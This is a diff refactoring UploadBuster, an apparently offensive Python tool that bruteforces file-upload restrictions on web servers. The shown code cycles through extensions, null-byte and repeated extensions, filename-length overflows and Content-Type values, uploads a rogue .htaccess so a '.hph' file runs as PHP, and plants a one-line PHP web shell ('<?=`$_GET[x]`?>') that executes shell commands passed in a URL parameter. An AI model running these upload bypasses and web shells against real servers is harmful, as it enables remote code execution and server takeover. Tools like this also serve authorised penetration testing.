@@ -7,7 +7,7 @@ from time import sleep
 
 ___banner = '''
 
-   __  __      __                __/___      
+   __  __      __                ______      
   / / / /___  / /___  ____ _____/ / __ )__  _______/ /____  _____
  / / / / __ \/ / __ \/ __ `/ __  / __  / / / / ___/ __/ _ \/ ___/
 / /_/ / /_/ / / /_/ / /_/ / /_/ / /_/ / /_/ (__  ) /_/  __/ /    
@@ -158,17 +158,13 @@ class UploadBuster:
         print(f"[+] Executing Bruteforce filename extension")
         for self.payload_file_ext in self._configuration['exts'][self.args_backend]:
             self._add_random_lower_and_upper_case_ext()
-            self._refresh_format()
-            self._send_post_request()
-            self._print_init()
+            self._send_formated_request_print()
 
     def _bruter_null_file_ext(self):
         print(f"[+] Executing Bruteforce Null filename extension")
         for self.payload_file_ext in self._configuration['exts']["null"]:
             self._change_payload_file_ext("." + self.args_backend + self.payload_file_ext)
-            self._refresh_format()
-            self._send_post_request()
-            self._print_init()
+            self._send_formated_request_print()
 
     def _bruter_multi_ext(self):
         print(f"[+] Executing Bruteforce filename extension")
@@ -176,25 +172,18 @@ class UploadBuster:
             _temp = self.payload_file_ext
             for _loops in range(1, 8):
                 self._change_payload_file_ext(self.payload_file_ext + _temp)
-                self._refresh_format()
-                self._send_post_request()
-                self._print_init()
+                self._send_formated_request_print()
 
     def _bruter_filename_limit(self):
         print(f"[+] Executing Break filename length limit")
         for _index in range(999):
-            self._change_payload_file_ext("." + self.args_backend + (_index * "A"))
-            self._refresh_format()
-            self._send_post_request()
-            self._print_init()
-
+            self._change_payload_file_name(self.args.payload + (_index * "A"))
+            self._send_formated_request_print()
     def _bruter_content_type(self):
         print(f"[+] Executing Bruteforce Content-type header")
         for self.payload_content_type in self._configuration['content_types']:
             self._change_payload_file_ext("." + self.args_backend)
-            self._refresh_format()
-            self._send_post_request()
-            self._print_init()
+            self._send_formated_request_print()
 
     # tech
     def _tech_add_execution_extension(self):
@@ -205,18 +194,14 @@ class UploadBuster:
             self._change_payload_file_ext("")
             self._change_payload_content_type("application/x-php")
             self.args_user_payload_file_name = ".htaccess"
-            self._refresh_format()
-            self._send_post_request()
-            self._print_init()
+            self._send_formated_request_print()
 
         def upload_new_payload():
             self._add_random_file_name_to_payload()
             self._change_payload_file_ext(".hph")
             self._change_payload_content_type("application/x-php")
             self.args_user_payload_file_name = self.args.payload
-            self._refresh_format()
-            self._send_post_request()
-            self._print_init()
+            self._send_formated_request_print()
 
         upload_htaccess()
         upload_new_payload()
@@ -224,9 +209,7 @@ class UploadBuster:
     def _tech_short_php_payload(self):
         self._set_payload_data("<?=`$_GET[x]`?>")
         self._change_payload_file_ext(".php")
-        self._refresh_format()
-        self._send_post_request()
-        self._print_init()
+        self._send_formated_request_print()
 
     def _refresh_format(self):
         self.request_files.update({self.payload_upload_variable: (self.payload_file_name + self.payload_file_ext,
@@ -272,6 +255,11 @@ class UploadBuster:
                 return True
         else:
             return False
+
+    def _send_formated_request_print(self):
+        self._refresh_format()
+        self._send_post_request()
+        self._print_init()
 
     def main(self):
 
